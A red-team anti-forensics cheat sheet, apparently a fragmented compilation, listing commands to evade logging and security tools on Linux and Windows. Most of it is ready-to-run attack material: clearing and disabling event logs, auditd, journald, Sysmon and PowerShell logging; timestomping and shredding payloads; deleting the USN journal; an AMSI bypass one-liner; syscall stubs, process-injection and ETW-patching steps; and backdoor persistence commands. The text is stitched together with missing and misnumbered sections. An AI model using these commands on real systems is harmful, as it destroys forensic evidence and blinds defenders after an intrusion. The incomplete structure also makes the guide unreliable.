1. FOUNDATIONS: THE LOGGING LANDSCAPE
================================================================================

Before you can evade logs, you must understand WHAT is logging you.

LAYERS OF LOGGING:
  1. Endpoint OS logs (Windows Event Logs, Linux syslog/journald)
  2. Endpoint security agents (EDR, AV, HIDS)
  3. Network logs (firewall, proxy, DNS server, NetFlow, IDS)
  4. Application logs (web server, database, authentication services)
  5. Central SIEM (aggregates everything - clearing local log does NOT
     clear what has already been forwarded)

KEY RULE #1: Assume logs are CENTRALIZED. Clearing local logs only works
if there is no log forwarding configured (rare in enterprises).

KEY RULE #2: Attack the log pipeline, not just the file. Syslog over
UDP/514, Windows Event Forwarding (WEF), EDR cloud upload.

--------------------------------------------------------------------------------
1.1 WINDOWS EVENT LOGS
--------------------------------------------------------------------------------

Location: C:\Windows\System32\winevt\Logs\
Format: .evtx (binary XML)

Key logs:
  - Security        (audit policy driven, event IDs 46xx/47xx/48xx)
  - System          (service installs, driver loads, 7045)
  - Application     (app crashes, .NET logging)
  - Windows PowerShell          (400/403 - legacy PS 2.0 logging)
  - Windows PowerShell/Operational (4103 module, 4104 script block)
  - Microsoft-Windows-Sysmon/Operational (Sysmon events)
  - Microsoft-Windows-WMI-Activity/Operational (WMI persistence/execution)
  - Microsoft-Windows-TaskScheduler/Operational (persistence via tasks)
  - Microsoft-Windows-Windows Defender/Operational (AV detections)
  - Microsoft-Windows-AppLocker/EXE and DLL (AppLocker events)
  - Microsoft-Windows-TaskScheduler/Operational
  - Microsoft-Windows-TerminalServices-LocalSessionManager (RDP 21/24/25)

Critical event IDs a blue teamer watches:
  1102  - Audit log was CLEARED (huge red flag)
  104   - System event log cleared
  4624  - Successful logon
  4625  - Failed logon (brute force)
  4648  - Logon with explicit credentials (runas, psexec, lateral)
  4672  - Special privileges assigned to new logon (admin logon)
  4688  - Process created (with command line if enabled)
  4698  - Scheduled task created
  4720  - User account created
  4732  - Member added to local group
  7045  - New service installed (classic psexec/smbexec artifact)
  4104  - PowerShell script block logging (captures deobfuscated code)
  4103  - PowerShell module logging
  Sysmon 1    Process Create
  Sysmon 3    Network connection
  Sysmon 7    Image/Module Load
  Sysmon 8    CreateRemoteThread (injection)
  Sysmon 10   Process Access (lsass access for creds)
  Sysmon 11   FileCreate (payload staging)
  Sysmon 13   Registry value set (persistence)
  Sysmon 19   WMI filter/consumer (WMI persistence)
  Sysmon 22   DNS query

View logs from CLI:
  eventvwr.msc
  wevtutil sl  (list logs)
  wevtutil qe Security /c:50 /rd:true /f:text   (query last 50 events)

--------------------------------------------------------------------------------
  - Firewall: iptables/nftables (conntrack), Windows Firewall, pfSense

  - Sysmon: free, from Sysinternals - high-fidelity event source.

2. WHY EVADE: OPSEC MINDSET & DETECTION SURFACES
================================================================================

THE ATTACKER'S DILEMMA: Every action you take leaves a trace. Your job
is to maximize mission objectives while minimizing (and delaying)
detection.

DETECTION SURFACES AT EACH KILL CHAIN PHASE:
  Recon      -> Whois, DNS queries, port scans (logged by IDS)
  Weaponize  -> Local only (avoid AV cloud submission)
  Delivery   -> Email gateway, web proxy logs
  Exploit    -> AV/EDR exploit mitigation, crash dumps
  Install    -> File create events (Sysmon 11), autoruns
  C2         -> Network logs (DNS, proxy, NetFlow), beacon patterns
  Actions    -> Process creation, lateral movement, auth logs
  Cleanup    -> Log clearing itself is the loudest signal (1102!)

OPSEC RULES OF THE ROAD (red team best practice):
  1. NEVER clear ALL logs. It screams compromise. Prefer selective
     edits or avoid logging in the first place.
  2. Prefer techniques that NEVER generate logs over techniques
     that require log deletion afterwards.
  3. Blend with admin baselines. What does normal look like?
  4. Move slowly. Low-and-slow beats fast-and-noisy.
  5. Assume every command line is captured and sent to a SIEM.
  6. Encrypt C2. Assume cleartext HTTP C2 is detected.
  7. Clear YOUR artifacts only: PowerShell history, bash history,
     specific events you created - not the entire Security log.

ATTACKER'S BEST FRIEND: Legitimate admin tools (PowerShell, WMI,
certutil, mshta, bash, python) execute with the same privileges and
appearance as real admins.

4. LINUX: EVADING LOCAL LOGS

--------------------------------------------------------------------------------
4.1 BASH HISTORY - THE FIRST THING TO DISABLE
--------------------------------------------------------------------------------

Prevent future commands from being logged (run FIRST):
  export HISTFILE=/dev/null
  export HISTSIZE=0
  export HISTFILESIZE=0
  unset HISTFILE
  set +o history
  history -c

Per-command: prefix with a space (if HISTCONTROL=ignorespace is set):
  ls -la /etc/shadow
  (check: echo $HISTCONTROL)

One-shot clean command + exit:
  bash -c 'rm -f ~/.bash_history; ln -s /dev/null ~/.bash_history'
  (works on some systems; fails if file immutable or owned by root)

Symlink history to /dev/null before logging in as another user:
  ln -sf /dev/null ~/.bash_history
  su - user   (if their .bash_history already symlinked)

Clear specific command from history:
  sed -i '/password/d' ~/.bash_history
  vi ~/.bash_history   (manual edit)
  history -d <offset>

Other shell histories:
  ~/.zsh_history       (zsh)
  ~/.python_history    (python REPL - can contain imported payloads)
  ~/.mysql_history     (SQL queries - DB creds!)
  ~/.sh_history        (ksh)
  ~/.ash_history       (busybox/ash)
  /root/.bash_history  (root's history - MUST check)

Clear ALL shell histories at once:
  find / -name ".*history" -exec rm {} \; 2>/dev/null

tmux/screen logging:
  # tmux logs sessions if logging enabled by default (rare)
  # screen hardcopy files: rm /tmp/screen-* /tmp/hardcopy*

--------------------------------------------------------------------------------
4.2 LINUX AUTH & LOGIN LOGS
--------------------------------------------------------------------------------

Clear auth log:
  > /var/log/auth.log
  # or truncate without deleting inode (triggers FIM on delete):
  truncate -s 0 /var/log/auth.log
  cat /dev/null > /var/log/auth.log

Clear secure (RHEL):
  > /var/log/secure
  > /var/log/secure-*

Clear syslog/messages:
  > /var/log/syslog
  > /var/log/messages
  > /var/log/syslog-*
  > /var/log/messages-*

Clear cron log:
  > /var/log/cron

Clear wtmp/btmp/lastlog (login records):
  > /var/log/wtmp
  > /var/log/btmp
  > /var/log/lastlog
  > /var/log/utmp

Alternative for wtmp (binary):
  cat /dev/null > /var/log/wtmp

Selective edit (remove YOUR entry from auth.log):
  grep -v "sshd.*from YOUR_IP" /var/log/auth.log > /tmp/a
  mv /tmp/a /var/log/auth.log
  # WARNING: mtime changes, file size shrinks - FIM will notice

Clean ALL logs quickly (dangerous OPSEC-wise - screams compromise):
  find /var/log -type f -exec truncate -s 0 {} \;
  # or
  rm -rf /var/log/*
  # or
  rm -rf /var/log/* && mkdir /var/log && chmod 755 /var/log

Keep log files but clear rotation archives:
  rm -f /var/log/*.gz /var/log/*.1 /var/log/*.old /var/log/*-*

--------------------------------------------------------------------------------
4.3 SYSTEMD JOURNALD
--------------------------------------------------------------------------------

Clear entire journal:
  journalctl --vacuum-time=1s
  journalctl --vacuum-size=1K
  rm -rf /var/log/journal/*

Clear specific unit logs:
  journalctl -u ssh -q --vacuum-time=1s
  # delete entries mentioning your IP:
  journalctl | grep -v "10.0.0.66" | systemd-cat

Set journald to volatile (RAM only - config in /etc/systemd/journald.conf):
  [Journal]
  Storage=volatile
  # then: systemctl restart systemd-journald

Disable journald persistence:
  rm -rf /var/log/journal
  mkdir -p /etc/systemd/journald.conf.d
  echo -e "[Journal]\nStorage=none" > /etc/systemd/journald.conf.d/no.conf
  systemctl restart systemd-journald

View journal WITHOUT persistence needed:
  journalctl --file=/var/log/journal/*/system.journal

--------------------------------------------------------------------------------
4.4 AUDITD - THE BIGGEST LINUX OBSTACLE
--------------------------------------------------------------------------------

If auditd is running, it logs execve() of EVERY command - independent
of shell history. You cannot easily hide from a running auditd without
root + rule removal.

List rules:
  auditctl -l

Disable audit rules (temporarily, until reboot):
  auditctl -e 0      # disable audit (needs -f 1 or root; 0=disable)
  auditctl -D        # delete ALL rules
  # or unload rules:
  augenrules --check
  rm -f /etc/audit/rules.d/*.rules

Stop auditd service:
  service auditd stop
  systemctl stop auditd
  # NOTE: many distros protect auditd from being stopped - you may get:
  # "Failed to stop auditd.service: Operation refused"

Force kill:
  kill -9 $(pidof auditd)
  # or
  pkill -9 auditd

Clear audit log itself:
  > /var/log/audit/audit.log
  > /var/log/audit/audit.log.*

Set auditd to immutable mode? (that's defender config - you want the
opposite: disable before it becomes immutable)

Check if auditd is even running:
  ps aux | grep auditd
  systemctl status auditd

NOTE: On systems with eBPF-based audit or auditd + immutable rules
(auditctl -e 2), you CANNOT disable without reboot.

--------------------------------------------------------------------------------
4.5 LINUX TIMESTOMPING
--------------------------------------------------------------------------------

Files record atime/mtime/ctime. ctime cannot be changed directly by
user (metadata change time). mtime and atime can be set.

Set mtime/atime to arbitrary time:
  touch -d "2020-01-01 00:00:00" /tmp/backdoor.sh
  touch -t 202001010000 /tmp/backdoor.sh   (compact format)

Copy timestamps from another file:
  touch -r /etc/passwd /tmp/backdoor.sh

Set both in one:
  TZ=UTC touch -d "2019-05-05 12:00:00" ./exploit

Bulk restore original timestamps (defensive-style anti-forensics):
  # (hard without a manifest of original times)

Extended attributes (for FIM evasion):
  setfattr -n user.log.off -v 1 file   (some FIM tools check xattrs)
  # actually just clear xattrs:
  setfattr -x user.foo file

Debugfs (ext4, offline, root):
  debugfs -w /dev/sda1
  debugfs: set_inode_field <inode> atime 20200101
  debugfs: set_inode_field <inode> mtime 20200101
  # WARNING: dangerous, requires unmounted filesystem or direct block

--------------------------------------------------------------------------------
4.6 LINUX FILE DELETION & ANTI-FORENSICS
--------------------------------------------------------------------------------

Secure delete (shred):
  shred -vfzun 5 /tmp/payload.sh
  # -v verbose, -f force, -z final zero pass, -u unlink, -n passes

Secure delete alternative:
  wipe -f -q /tmp/payload.sh

dd over free space:
  dd if=/dev/urandom of=/tmp/filler bs=1M count=200
  rm /tmp/filler

Check for file recovery tools (to know what blue team uses):
  testdisk, photorec, extundelete, testdisk, foremost, scalpel

Remove empty directories left behind:
  rmdir -p /tmp/hidden/dir 2>/dev/null

4.7 LINUX: OTHER STEALTH TRICKS
--------------------------------------------------------------------------------

Execute command without leaving shell history (bash):
  bash -c 'command here'   (new bash - still logs via auditd)
  # or
  exec bash --norc --noprofile -c 'whoami'

  cp payload /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x
  rm /dev/shm/x

  mount | grep tmp   (check)

  # usually not an issue

Hide files with leading space/dot:
  touch " .hidden_payload"
  touch .hidden_payload

Chattr immutable (defensive, but also for protecting your backdoor):
  chattr +i /tmp/persistence.sh

BPF program hiding? (advanced - rootkit territory)

  crontab -l | grep -v "malicious" | crontab -

  # /var/spool/cron/crontabs/root

  rm /etc/systemd/system/malicious.service
  systemctl disable malicious.service
  rm /etc/cron.d/backdoor

--------------------------------------------------------------------------------
5.1 CLEARING WINDOWS EVENT LOGS (T1070.001)
--------------------------------------------------------------------------------

CMD - wevtutil (Windows Event Log Utility):

List all logs:
  wevtutil el

Query a log:
  wevtutil qe Security /c:10 /rd:true /f:text
  wevtutil qe "Microsoft-Windows-Sysmon/Operational" /f:text

CLEAR a log (generates Event 1102 in Security if auditing enabled):
  wevtutil cl Security
  wevtutil cl System
  wevtutil cl Application
  wevtutil cl "Windows PowerShell"
  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
  wevtutil cl "Microsoft-Windows-Sysmon/Operational"
  wevtutil cl "Microsoft-Windows-WMI-Activity/Operational"
  wevtutil cl "Microsoft-Windows-TaskScheduler/Operational"

Clear ALL logs (batch script):
  @echo off
  for /f "tokens=*" %i in ('wevtutil el') do wevtutil cl "%i"

Or PowerShell:
  Get-WinEvent -ListLog * | Where-Object { $_.RecordCount -gt 0 } |
    ForEach-Object { wevtutil cl $_.LogName }

DISABLE a log (stop it recording - stealthier than clearing):
  wevtutil sl Security /e:false
  wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false
  wevtutil sl Sysmon /e:false
  # re-enable:
  wevtutil sl Security /e:true

Export logs before clearing (for your own OPSEC analysis):
  wevtutil epl Security C:\Temp\sec.evtx

--------------------------------------------------------------------------------
5.2 POWERSHELL LOG CLEARING
--------------------------------------------------------------------------------

Clear a single log:
  Clear-EventLog -LogName Security
  Clear-EventLog -LogName System, Application

Clear via .NET:
  [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Security")

Clear PowerShell history file:
  Remove-Item (Get-PSReadlineOption).HistorySavePath
  # or truncate:
  Clear-Content (Get-PSReadlineOption).HistorySavePath
  # path is usually:
  # %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Disable PSReadLine history for current session:
  Set-PSReadLineOption -HistorySaveStyle SaveNothing

Clear Windows PowerShell log (legacy):
  Remove-EventLog -LogName "Windows PowerShell"
  # (this removes the log entirely - too aggressive, recreates on reboot)

--------------------------------------------------------------------------------
5.3 WINDOWS AUDIT POLICY - DISABLING (T1562.002)
--------------------------------------------------------------------------------

View audit policy:
  auditpol /get /category:*

Disable process creation auditing (stops 4688 + command line logging):
  auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable

Disable logon auditing:
  auditpol /set /subcategory:"Logon" /success:disable /failure:disable

Disable ALL auditing:
  auditpol /set /category:* /success:disable /failure:disable

Reset to default:
  auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

Disable via registry (requires reboot, and Group Policy may override):
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f

Disable command line in process creation:
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f

NOTE: Enterprise GPO may re-apply audit policy periodically. Check:
  gpupdate /force
  gpresult /h report.html

5.4 DISABLING POWERSHELL SCRIPT BLOCK & MODULE LOGGING
--------------------------------------------------------------------------------

Script Block Logging (Event 4104) - registry:
  reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /f

5.5 SYSMON CONFIG MANIPULATION
--------------------------------------------------------------------------------

Sysmon logs high-fidelity events. If you can modify its config, you can
blind it.

Find Sysmon config:
  # Sysmon64.exe -c   (view config)
  # or check registry:
  reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters"

Change Sysmon config to log nothing useful:
  # Sysmon requires a config file - if you replace config with empty
  # filters, it may stop logging or log differently.
  # Sysmon64.exe -c .\empty_config.xml

Empty Sysmon config (logs nothing useful):
  <Sysmon schemaversion="4.90">
    <HashAlgorithms>None</HashAlgorithms>
    <EventFiltering>
    </EventFiltering>
  </Sysmon>

Uninstall/stop Sysmon:
  Sysmon64.exe -u force
  # or stop service:
  sc stop Sysmon
  sc delete Sysmon

Replace config (needs admin + Sysmon service restart to reload):
  Sysmon64.exe -c malicious_config.xml

NOTE: Sysmon64.exe -u is logged. Config changes are logged too if
centralized. Better: live memory patching of Sysmon driver (advanced).

--------------------------------------------------------------------------------
5.7 ETW (EVENT TRACING FOR WINDOWS) EVASION
--------------------------------------------------------------------------------

ETW is the underlying telemetry framework for Windows + most EDRs.

Concept: patch EtwEventWrite in memory to return immediately (NOP/return).

Classic userland ETW patching (educational example - real EDRs detect
this pattern):
  $etw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Diagnostics.Process]::GetCurrentProcess().MainModule.ModuleMemoryAddress + <offset>,
    [type][Action]
  )
  # Actual patching requires:
  # 1. Get ntdll!EtwEventWrite address (GetProcAddress via P/Invoke)
  # 2. VirtualProtect to RWX
  # 3. Write 0xC3 (ret) or jump-to-return gadget
  # 4. VirtualProtect back
  # Tools: ETWp, amsi.etw patchers in Cobalt Strike, Covenant

EDR-specific ETW providers that watch for this:
  Microsoft-Windows-Threat-Intelligence (TI)
  Microsoft-Windows-Windows Defender
  Microsoft-Antimalware-Scan-Interface

Modern EDRs use kernel callbacks + minifilters + ELAM drivers that
cannot be patched from userland alone.

--------------------------------------------------------------------------------
5.8 AMSI (ANTI-MALWARE SCAN INTERFACE) BYPASS
--------------------------------------------------------------------------------

AMSI scans: PowerShell scripts, JScript/VBScript, Office macros,
COM objects.

6. LOG TAMPERING vs CLEARING - OPSEC STRATEGY
================================================================================

CLEARING (wevtutil cl):
  + Removes all trace from that log
  - Generates Event 1102 (log cleared) in Security log
  - Forensic timeline gap visible
  - SIEM may already have forwarded old entries

DISABLING (wevtutil sl /e:false):
  + No clear event generated
  - Log stops recording (gap visible in SIEM heartbeats)
  - Requires re-enabling for legitimate ops

SELECTIVE EDIT:
  - Export to EVTX, manipulate offline, re-import (complex)
  - Use LogParser / wevtutil to filter specific EventIDs
  - Risk: XML structure mismatches, SID resolution failures

BEST PRACTICE (red team): NEVER clear Security log. Instead:
  1. Disable logging BEFORE action (if possible)
  2. Or avoid generating logs at all (in-memory, LOLBins)
  3. Clear ONLY PowerShell history / specific artifacts you created
  4. Use alternate execution paths that don't log

8.3 SHELLCODE Evasion (ROP, syscalls)
--------------------------------------------------------------------------------

Userland EDR hooks: EDR installs hooks in ntdll.dll (NtAllocateVirtualMemory,

Bypass hooking:
  1. Unhooking: re-read ntdll.dll from disk (KnownDlls), restore clean copy
     over the hooked in-memory copy, then call clean functions
     Tools: Syswhispers, Donut, inlineUnhook, various C2 frameworks
  2. Direct syscalls: use SYSCALL instruction directly with correct
     syscall numbers (SSN) from ntdll, bypassing hooks entirely

  3. Indirect syscalls: get SSN from hooked ntdll but invoke via
     unhooked syscall gadget

  - Process Hollowing (NtUnmapViewOfSection + Write + ResumeThread)
  - APC injection (QueueUserAPC)
  - Early Bird injection (before process main thread runs)
  - Module Stomping (load legit DLL, overwrite its memory)
  - Phantom DLL hollowing
  - Transacted hollowing
  - Process Doppelgänging (NTFS transactions)
  - Herpaderping
  - PROPagate injection
  - ListPlanting

EDR detection:
  - Cross-process memory writes
  - CreateRemoteThread into non-svchost
  - RWX memory transitions
  - Unsigned DLL injected into signed process
  - Sysmon 8 (CreateRemoteThread), Sysmon 10 (ProcessAccess)

10. EDR / AV EVASION - ADVANCED CONCEPTS

--------------------------------------------------------------------------------
10.1 EDR ARCHITECTURE (know what you're evading)
--------------------------------------------------------------------------------

EDR components:
  1. Userland agent (hooks, telemetry, local detection)
  2. Kernel driver (minifilter for file, callbacks for process/thread,
     ObRegisterCallbacks, CmRegisterCallback for registry, ELAM driver)
  3. Cloud backend (ML, behavior analytics, threat intel)
  4. Console / SIEM integration

Detection methods you face:
  - Userland hooks (ntdll, kernel32, win32u)
  - Kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks)
  - Minifilter (file operations, IRP_MJ_*)
  - ETW providers (TI, AMSI, Defender)
  - AMSI content scanning
  - Cloud ML on behavior sequence
  - Memory scanning (YARA on process memory)
  - Parent-child tree analysis
  - Module load monitoring (Sysmon 7)
  - Syscall anomaly detection

--------------------------------------------------------------------------------
10.2 UNHOOKING NT.DLL
--------------------------------------------------------------------------------

Concept: Restore clean ntdll.dll from KnownDlls section, overwriting
hooks the EDR installed in userland.

Steps:
  1. Open \\KnownDlls\\ntdll.dll section
  2. MapViewOfFile (clean copy)
  3. VirtualProtect in-memory ntdll to RWX
  4. Copy clean bytes over hooked ntdll
  5. Restore protections

Tools implementing this:
  - Syswhispers + Syscalls libraries
  - inlineHook (various GitHub repos)
  - Cobalt Strike BOF (unhookNTDLL)
  - SharpSploit, GhostPack (Rubeus, Seatbelt use techniques)

EDR countermeasure:
  - Kernel-level detection (detect VirtualProtect on ntdll)
  - Re-check hooks periodically
  - Kernel callbacks still fire regardless of userland hooks

--------------------------------------------------------------------------------
10.3 DIRECT / INDIRECT SYSCALLS
--------------------------------------------------------------------------------

Direct syscall (conceptual assembly):
  mov r10, rcx          ; NT syscall convention
  mov eax, <SSN>        ; syscall number (e.g., 0x18 for NtAllocateVirtualMemory)
  syscall
  ret

Syswhispers3 generates:
  NtAllocateVirtualMemorySSN equ 0x18
  Sw3NtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, NtAllocateVirtualMemorySSN
    syscall
    ret
  Sw3NtAllocateVirtualMemory ENP

Hells Gate: dynamically resolve SSN from clean ntdll at runtime
Halo's Gate: if ntdll hooked, search neighboring functions for SSN
Tartarus Gate: resolve via syscall gadget search

--------------------------------------------------------------------------------
10.4 PROCESS INJECTION (T1055)
--------------------------------------------------------------------------------

Classic DLL Injection (detected by EDR):
  1. OpenProcess(PROCESS_ALL_ACCESS)
  2. VirtualAllocEx(target, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  3. WriteProcessMemory(target, buffer, shellcode)
  4. CreateRemoteThread(target, start=shellcode)
  5. WaitForSingleObject

Detection: Sysmon 8 (CreateRemoteThread), Sysmon 10 (ProcessAccess),
ObRegisterCallbacks (blocks OpenProcess on lsass)

Process Hollowing (T1055.012):
  1. CreateProcess(suspended)
  2. NtUnmapViewOfSection(target, base)
  3. VirtualAllocEx at target base
  4. WriteProcessMemory (PE headers + sections)
  5. SetThreadContext (update entry point)
  6. ResumeThread

Module Stomping:
  1. Load legitimate DLL into target (LoadLibrary via CreateRemoteThread)
  2. Overwrite DLL's .text section with shellcode
  3. Execute via CreateRemoteThread pointing into DLL

EDR detection: Sysmon 7 (Image/Module Load), memory protection changes,
unsigned module in signed process.

--------------------------------------------------------------------------------
10.5 AMSI/ETW/PatchGuard INTERACTION
--------------------------------------------------------------------------------

PatchGuard (Kernel Patch Protection):
  - Patches to kernel (ntoskrnl, SSDT) trigger BSOD
  - Userland only: ETW, AMSI can be patched
  - Direct kernel objects (DKOM) - rootkit territory, PatchGuard detects

ELAM (Early Launch Antimalware):
  - AV/EDR driver loads first, validates other drivers
  - Blocks unsigned/malicious drivers from loading
  - Bypass requires signed vulnerable driver (bring your own vulnerable
    driver - BYOVD) - advanced, out of scope for most labs

BYOVD (Bring Your Own Vulnerable Driver):
  - Use legitimately signed but vulnerable driver to disable EDR
  - Example: Dell dbutil_2_3.sys, various Intel drivers
  - Dangerous: can BSOD or brick system

  ipconfig /flushdns

  # ARP
  arp -d *

  # Event logs (selective, see section 5)
  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
  # DO NOT clear Security unless absolutely necessary (1102 alarm)

  # Shimcache / AmCache / SRUM (see 5.11)

  # Windows Error Reporting artifacts:
  rm -rf C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*
  rm -rf C:\ProgramData\Microsoft\Windows\WER\ReportQueue\*

  # Thumbnail cache
  del %LOCALAPPDATA%\Thumbcache_*.db

  # SRUM (network + app history database):
  del C:\Windows\System32\sru\SRUDB.dat

  # MFT / USN journal (file operation history):
  fsutil usn deletejournal /d C:

11.3 MEMORY ANTI-FORENSICS
--------------------------------------------------------------------------------

  # Clear command history from process memory (advanced):
  # - Use direct syscalls instead of Win32 APIs (no userland logs)
  # - Clear sensitive strings from memory after use (RtlSecureZeroMemory)
  # - UnmapViewOfSection to remove DLLs from memory
  # - Use reflective loading (no module list entry in PEB)

  # - Disable core dumps on Linux: ulimit -c 0
  # - Windows: Disable WER (Windows Error Reporting)
  # - Or ensure payload is encrypted in memory, key zeroed after use

================================================================================
12. ADVANCED TECHNIQUES
================================================================================

--------------------------------------------------------------------------------
12.1 LOG INJECTION / FLOODING (T1070 / noise)
--------------------------------------------------------------------------------

Idea: Generate so much legitimate log noise that your malicious entries
are buried / SIEM alert fatigue sets in.

Techniques:
  - Rapid failed logins (flood Security log with 4625)
  - Rapid file creates (flood Sysmon 11)
  - Rapid DNS queries (flood DNS logs)
  - Rapid scheduled task creates (flood 4698)
  - PowerShell script spam (flood 4104)

Countermeasure (defender):
  - Separate high-fidelity sources (Sysmon, EDR) from noisy logs
  - Rate-limit / aggregation rules
  - Anomaly detection on log volume

--------------------------------------------------------------------------------
12.2 LOG CORRUPTION / API HOOKING
--------------------------------------------------------------------------------

Hook the Event Write API in memory to drop events before they're written:

  # Hook ReportEventW (kernel32) or EtwEventWrite (ntdll)
  # When Event ID == 4688 or 1102, skip the write

This is rootkit-like behavior, detected by:
  - EDR memory integrity checks
  - Code integrity / HVCI
  - ELAM driver validation

--------------------------------------------------------------------------------
12.3 KERNEL ROOTKITS (T1014) - concept only
--------------------------------------------------------------------------------

Hide: processes, files, network connections, registry keys, modules

Methods:
  - SSDT hooking (PatchGuard detects on x64)
  - DKOM (Direct Kernel Object Manipulation) - hide from PsActiveProcessHead
  - Minifilter drivers (hide files)
  - Netfilter hooks (hide network)
  - Hypervisor rootkits (Blue Pill concept)

Modern defenses:
  - HVCI (Hypervisor-protected Code Integrity)
  - PatchGuard
  - ELAM
  - Kernel DMA Protection
  - Secure Boot

NOTE: Writing kernel rootkits is advanced, OS-version-specific, and
breaks easily. Out of scope for most red team labs.

--------------------------------------------------------------------------------
12.4 ETW EVENT TAMPERING
--------------------------------------------------------------------------------

ETW providers feed Windows + many EDRs.

  # Unregister a provider (requires admin):
  # Or patch EtwEventWrite in memory (see 5.6)

  # Kernel ETW (Event Tracing for Windows kernel sessions):
  # logman stop -ets
  # logman query -ets  (list sessions)
  # logman delete <name> -ets

  # Stop system logger:
  logman stop "EventLog-System" -ets

--------------------------------------------------------------------------------
12.5 PERSISTENCE WITHOUT ARTIFACTS
--------------------------------------------------------------------------------

Registry Run keys (noisier - Sysmon 13, autoruns tools):
  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /d "powershell -enc ..." /f

WMI permanent event subscription (no file):
  # Filter: __InstanceCreationEvent on Win32_Process, name = "cmd.exe"
  # Consumer: CommandLineTemplate = "powershell -enc ..."
  # Binding: __FilterToConsumerBinding
  # Stored in WMI repository, no standalone file

Scheduled task (noisier - Event 4698):
  schtasks /create /tn "WindowsUpdate" /tr "powershell -enc ..." /sc daily /st 09:00

Startup folder (noisier):
  copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

Service creation (Event 7045 - very noisy):
  sc create Backdoor binPath= "C:\Temp\p.exe" start= auto

DLL hijacking / search order hijacking (T1574):
  # Place malicious DLL in directory searched before legit one
  # No registry/log entries for the DLL itself

COM hijacking (T1546.015):
  # Modify HKCU CLSID InprocServer32 to load your DLL
  # HKCU takes precedence over HKLM

Scheduled task via XML (less noisy in some cases):
  schtasks /create /xml malicious.xml /tn TaskName

13. BLUE TEAM PERSPECTIVE: WHAT DETECTS YOU
================================================================================

As a red teamer, you MUST know what blue teams see:

--------------------------------------------------------------------------------
13.1 SIEM / LOG MONITORING
--------------------------------------------------------------------------------

Alerts that fire when you:
  - Clear ANY event log (Event 1102)
  - Disable audit policy (auditpol changes)
  - Clear PS history
  - Disable Script Block Logging
  - Delete shadow copies (vssadmin)
  - Install new service (7045)
  - Create scheduled task (4698)
  - Add firewall rule
  - Modify registry Run keys (Sysmon 13)
  - Create WMI subscription (Sysmon 19)
  - Access LSASS (Sysmon 10)
  - Inject into process (Sysmon 8)
  - Write to Startup folder
  - Use certutil for download
  - Use mshta / regsvr32 with remote URL

--------------------------------------------------------------------------------
13.2 EDR DETECTIONS
--------------------------------------------------------------------------------

Behavioral chains EDRs catch:
  Word -> PowerShell (unusual parent-child)
  PowerShell -> Download cradle -> In-memory execution
  cmd.exe -> mshta with remote URL
  services.exe spawning interactive process
  Process with RWX memory + network access
  Unsigned code injection into signed process
  AMSI bypass attempts
  ETW patching attempts
  LSASS handle access by non-LSASS process

--------------------------------------------------------------------------------
13.3 NETWORK DETECTIONS
--------------------------------------------------------------------------------

  - Beaconing patterns (regular intervals)
  - DNS tunneling (entropy, volume, subdomain length)
  - Certificate anomalies (self-signed, mismatched SNI)
  - JA3/JA3S fingerprinting of TLS clients
  - HTTP headers anomalies
  - Large data transfers
  - Connections to known-bad C2 infrastructure (threat intel)

--------------------------------------------------------------------------------
13.4 FILE INTEGRITY MONITORING (FIM)
--------------------------------------------------------------------------------

Tools: OSSEC, Wazuh, Tripwire, AIDE, Qualys FIM

Detects:
  - Modified /etc/passwd, /etc/shadow, authorized_keys
  - Modified system binaries
  - New cron jobs
  - Modified audit rules
  - Modified systemd services
  - Windows: modified system32 DLLs, drivers

--------------------------------------------------------------------------------
13.5 HONEYPOT / DECOY TECHNIQUES
--------------------------------------------------------------------------------

Blue teams plant fake credentials, fake files, fake admin shares:

  - Canarytokens (canarytokens.org): tripwire files, DNS canaries
  - Fake SSH keys in honeypot
  - Honey user accounts in AD
  - Honey files with unique identifiers (breadcrumb tokens)
  - Fake cron jobs / services that alert when executed

Red team OPSEC: verify targets are real before interacting.

LINUX QUICK COMMANDS:
  # Disable history
  export HISTFILE=/dev/null; unset HISTFILE; history -c
  # Clear logs
  truncate -s 0 /var/log/auth.log
  > /var/log/syslog
  > /var/log/wtmp; > /var/log/btmp
  journalctl --vacum-size=1K
  # Disable auditd
  auditctl -D
  auditctl -e 0
  # Timestomp
  touch -d "2020-01-01 00:00:00" file
  # Secure delete
  shred -vfzun 5 file
  # RAM execution
  cp payload /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x

WINDOWS QUICK COMMANDS:
  # Clear PS history
  Remove-Item (Get-PSReadlineOption).HistorySavePath
  # Clear specific event logs
  wevtutil cl Security
  wevtutil cl "Microsoft-Windows-PowerShell/Operational"
  wevtutil cl "Microsoft-Windows-Sysmon/Operational"
  # Disable logging
  wevtutil sl Security /e:false
  # Disable audit
  auditpol /set /subcategory:"Process Creation" /success:disable /failure:disable
  # Disable Script Block Logging
  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /f
  # AMSI bypass (classic - educational)
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  # Timestomp
